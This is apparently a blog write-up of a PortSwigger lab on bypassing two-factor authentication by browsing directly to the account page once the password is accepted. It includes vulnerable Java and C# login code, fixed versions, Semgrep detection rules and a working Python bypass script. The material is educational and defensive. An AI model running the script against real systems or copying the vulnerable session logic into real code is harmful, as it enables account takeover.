---
title: "Lab 07: 2FA simple bypass"
date: 2025-12-19
categories: [portswigger, authentication] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-19-lab05_authentication/
---

## 1. Executive Summary

**Vulnerability:** Broken Two-Factor Authentication (2FA) via Forced Browsing.

**Description:** The application creates a valid, fully authenticated session cookie immediately after the user enters their correct username and password. The subsequent redirect to the "Enter 2FA Code" page is merely a frontend navigation step. The backend endpoints (like `/my-account`) fail to verify if the 2FA step was actually completed.

**Impact:** Complete bypass of 2FA. An attacker with stolen credentials (username/password) can log in and immediately navigate to restricted pages, ignoring the 2FA prompt entirely.

## 2. The Attack

**Objective:** Access `carlos`'s account page without his 2FA code.

1. **Reconnaissance:**
    - I logged in as myself (`wiener`/`peter`).
    - After entering the password, I was redirected to `/login2`.
    - I checked my cookies in the browser developer tools. I noticed a `session` cookie was *already* present.
    - I navigated to `/my-account`. The page loaded. I noted the URL.
2. **Exploitation:**
    - I logged out and logged in as the victim (`carlos`/`montoya`).
    - The system accepted the credentials and redirected me to the 2FA verification page (`/login2`).
    - **The Bypass:** Instead of entering a code, I manually changed the URL in the browser address bar to `/my-account` and hit Enter.
3. **Result:** The server accepted the request. Since I already held a valid session cookie (granted after the password step), the account page loaded successfully.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The flaw is **Premature Session Creation**. The application issues the "Golden Ticket" (the auth cookie) before the user has proven their identity completely.

- **The Flaw:** The `login` method calls `createSession()` immediately after checking the password.
- **The Reality:** The 2FA page is just a "suggestion." The server does not enforce 2FA completion on subsequent requests.

### Java (Spring Boot)

```java
@PostMapping("/login")
public String login(@RequestParam String username, @RequestParam String password, HttpSession session) {
    
    // 1. Check Password
    if (authService.checkCredentials(username, password)) {
        
        // VULNERABLE: We mark the user as 'logged in' right here!
        session.setAttribute("user", username);
        
        // Redirect to 2FA page
        return "redirect:/login2";
    }
    return "login_error";
}

@GetMapping("/my-account")
public String myAccount(HttpSession session) {
    // VULNERABLE: Only checks if 'user' attribute exists.
    // Since we set this in step 1, this passes immediately.
    if (session.getAttribute("user") != null) {
        return "account_page";
    }
    return "redirect:/login";
}
```

**Technical Flow & Syntax Explanation:**

- **`session.setAttribute("user", ...)`**: This effectively logs the user in. In Spring, this creates the `JSESSIONID` cookie and sends it to the browser.
- **`redirect:/login2`**: This sends a 302 response telling the browser to go to the 2FA page. However, the browser *already has the cookie*.
- **Missing Check**: The `myAccount` method does not check if `2fa_completed` is true. It only checks if the user exists.

### C# (ASP.NET Core)

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login(LoginModel model)
{
    if (await _userManager.CheckPasswordAsync(user, model.Password))
    {
        // VULNERABLE: Issues the Authentication Cookie immediately
        await _signInManager.SignInAsync(user, isPersistent: false);
        
        // Tells browser to go to 2FA page
        return RedirectToAction("TwoFactorAuth");
    }
    return View();
}

[Authorize] // Checks for Auth Cookie
[HttpGet("my-account")]
public IActionResult MyAccount()
{
    // If the cookie is valid (which it is), this executes.
    return View();
}
```

**Technical Flow & Syntax Explanation:**

- **`SignInAsync`**: This method serializes the user principal into an encrypted cookie and adds it to the response headers. The user is now authenticated as far as the framework is concerned.
- **`[Authorize]`**: This attribute validates the cookie. Since the cookie was issued in the previous step, this check passes, and the controller executes the request.

### Mock PR Comment

The `login` method creates a fully valid session cookie immediately after password verification. The subsequent redirect to the 2FA page relies on client-side compliance.

**Recommendation:** Do not issue the full session cookie after the password check. Instead, store a temporary "partial login" state (e.g., in a `PreAuth` session or signed token). Only issue the final authenticated session cookie after the 2FA code is successfully verified.

## 4. The Fix

**Explanation of the Fix:**
We introduce a **Multi-Stage Authentication** flow.

1. **Step 1:** Verify password. If correct, set a temporary session attribute `partial_auth = true`. Do NOT set the main `user` attribute.
2. **Step 2:** Verify 2FA code. If correct AND `partial_auth` is true, *then* set `user = username` and complete the login.
3. **Gatekeeper:** Sensitive pages must check for the full `user` attribute (or a specific `2fa_complete` flag).

### Secure Java

```java
@PostMapping("/login")
public String login(@RequestParam String user, @RequestParam String pass, HttpSession session) {
    if (check(user, pass)) {
        // SECURE: Do not set the 'user' object yet.
        // Set a temp flag indicating step 1 is done.
        session.setAttribute("pre_auth_user", user);
        return "redirect:/login2";
    }
    return "error";
}

@PostMapping("/login2")
public String verify2fa(@RequestParam String code, HttpSession session) {
    String preUser = (String) session.getAttribute("pre_auth_user");
    
    // SECURE: Check code AND previous step
    if (preUser != null && verifyCode(code)) {
        // NOW we issue the real session
        session.setAttribute("user", preUser);
        session.removeAttribute("pre_auth_user");
        return "redirect:/my-account";
    }
    return "error";
}
```

### Secure C#

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login(LoginModel model)
{
    // SECURE: Do not call SignInAsync yet.
    var result = await _signInManager.CheckPasswordSignInAsync(user, model.Password, false);
    if (result.Succeeded)
    {
        // Store the user ID in a temp cookie or TempData for the next step only
        // Do not issue the application cookie.
        return RedirectToAction("TwoFactorAuth", new { userId = user.Id });
    }
    return View();
}
```

## 5. Automation

*A Python script that logs in and immediately requests the protected page, proving the bypass.*

```python
#!/usr/bin/env python3
import argparse
import requests
import sys

def exploit_2fa_bypass(url, username, password):
    login_url = f"{url.rstrip('/')}/login"
    target_url = f"{url.rstrip('/')}/my-account"
    
    s = requests.Session()
    
    print(f"[*] Attempting login with {username}:{password}")
    
    # 1. Send Credentials
    data = {'username': username, 'password': password}
    resp = s.post(login_url, data=data)
    
    # IMPROVED CHECK:
    # If we are still on '/login', the password was wrong.
    # If we are on '/login2', the password was accepted.
    if "/login2" in resp.url:
        print("[+] Step 1 Successful: Redirected to 2FA page.")
    elif "/login" in resp.url:
        print("[-] Login Failed: Invalid credentials.")
        # We stop here because there is no point forcing the browse if we aren't logged in
        return
    else:
        print(f"[?] Unexpected URL: {resp.url}")

    # 2. Force Browse to Target (The Vulnerability)
    # We ignore the 2FA input field and request the account page directly.
    print(f"[*] Attempting 2FA Bypass -> GET {target_url}")
    resp = s.get(target_url)
    
    # 3. Verification
    if "Your username is" in resp.text or "Log out" in resp.text:
        print("[!!!] SUCCESS: Accessed account page without 2FA!")
    else:
        print("[-] Failed to bypass. You are likely still stuck on the login or 2FA page.")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("username", help="Victim username")
    ap.add_argument("password", help="Victim password")
    args = ap.parse_args()

    exploit_2fa_bypass(args.url, args.username, args.password)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules detect logic where the primary authentication cookie/session is established inside the "Password Verification" block, before any 2FA logic is invoked.*

### Java Rule

```yaml
rules:
  - id: java-premature-session-creation
    languages: [java]
    message: |
      Session attribute 'user' set immediately after password check. 
      If 2FA is required, ensure this attribute is only set AFTER the 2FA step.
    severity: WARNING
    patterns:
      - pattern: |
          if ($AUTH.checkPassword(...)) {
              ...
              // VULNERABLE: Logging in before 2FA
              $SESSION.setAttribute("user", ...);
              ...
              return "redirect:/2fa";
          }
```

**Technical Flow & Syntax Explanation:**

- **`pattern`**: Looks for a code block where `checkPassword` (or similar) is true, followed immediately by `session.setAttribute` (logging in), and *then* followed by a redirect to a 2FA page. This sequence proves the session exists before 2FA is done.

### C# Rule

```yaml
rules:
  - id: csharp-premature-signin
    languages: [csharp]
    message: "SignInAsync called before 2FA redirect. This allows forced browsing bypass."
    severity: WARNING
    patterns:
      - pattern: |
          if (await $MANAGER.CheckPasswordAsync(...)) {
              ...
              // VULNERABLE
              await $SIGNIN.SignInAsync(...);
              ...
              return RedirectToAction("TwoFactorAuth");
          }
```

**Technical Flow & Syntax Explanation:**

- **`SignInAsync`**: Matches the ASP.NET Core function that generates the auth cookie.
- **`RedirectToAction`**: If the code redirects to 2FA *after* signing in, the 2FA is effectively optional.
